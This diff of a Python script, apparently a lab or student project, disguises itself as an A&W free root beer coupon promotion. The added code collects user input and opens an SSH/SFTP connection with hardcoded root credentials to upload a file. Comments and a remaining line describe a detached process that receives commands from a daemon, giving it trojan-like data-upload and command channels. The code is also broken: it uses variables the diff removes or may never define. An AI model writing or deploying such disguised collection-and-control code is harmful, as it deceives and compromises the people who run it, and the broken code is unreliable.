@@ -38,17 +38,49 @@ import subprocess
 import sys
 import os
 
-key = paramiko.RSAKey(filename='test_rsa.key')
-transport = paramiko.Transport(('::2', 9001))
-transport.connect(username='root', password='toor', pkey=key)
 
-client = paramiko.SSHClient()
-client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-client.connect('::1',port=9000, username='root', password='toor')
-chan = client.get_transport().open_session()
+
+
+def fetchSFTP():
+    try:
+        host = "::1"
+        port = 9000
+        usr,  pwd = 'root', 'toor'
+        
+        key = paramiko.RSAKey(filename='test_rsa.key')
+        
+        ''''
+        transport = paramiko.Transport(('::1', 9000))
+        transport.connect(usr, pwd, pkey=key)
+        sftp = paramiko.SFTPClient.from_transport(transport)
+        '''
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.connect(host,port, usr, pwd,  key)
+        
+        sftp = client.open_sftp()
+        sftp.sshclient = client
+        
+        #TEST
+        file = open("mytestfile.txt",  "a")
+        file.write("Runescape Sucks")
+        file.close()
+        sftp.put("mytestfile.txt",  "transported.txt")
+        
+        return sftp
+    except Exception as e:
+        print("Unhandled exception ->"+ str(e))
+        
+        if sftp:
+            sftp.close()
+        if client:
+            client.close()
+    
+    #--------------End of fetch SFTP-----------#
+
+fetchSFTP()
 signUp = "y"
 infoBank = []
-
 while True:
     while(signUp == "y"):
         print("Welcome to A&W Free Root Beer & Coupouns Promotion! \n")
@@ -97,10 +129,6 @@ while True:
     
     ##double forked and detached##
     ##recieve commands from daemon here##
-
-    #sftp client connecting to server
-    sftp = paramiko.SFTPClient.from_transport(transport)
-    #sftp.put(file with data array)
 
     command = chan.recv(1024)
     command = command.decode()
